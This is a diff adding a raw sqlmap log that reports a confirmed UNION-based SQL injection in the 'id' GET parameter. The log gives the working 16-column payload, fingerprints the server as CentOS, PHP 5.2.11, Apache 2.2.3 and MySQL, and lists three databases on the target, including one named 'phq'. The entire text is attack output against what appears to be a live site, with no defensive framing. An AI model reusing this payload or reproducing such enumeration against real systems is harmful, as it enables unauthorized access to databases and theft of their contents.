@@ -1,0 +1,15 @@
+sqlmap identified the following injection point(s) with a total of 593 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: UNION query
+    Title: MySQL UNION query (82) - 16 columns
+    Payload: id=275' UNION ALL SELECT 82,82,CONCAT(0x71626a6b71,0x45724d4f6e67784379786a7a6e6b4a746748457a5042796474657a786f45646a4c4c6f6e4b574b4a,0x7178717671),82,82,82,82,82,82,82,82,82,82,82,82,82#
+---
+web server operating system: Linux CentOS 5.10
+web application technology: PHP 5.2.11, Apache 2.2.3
+back-end DBMS: MySQL >= 5.0.0
+available databases [3]:
+[*] information_schema
+[*] phq
+[*] test
+
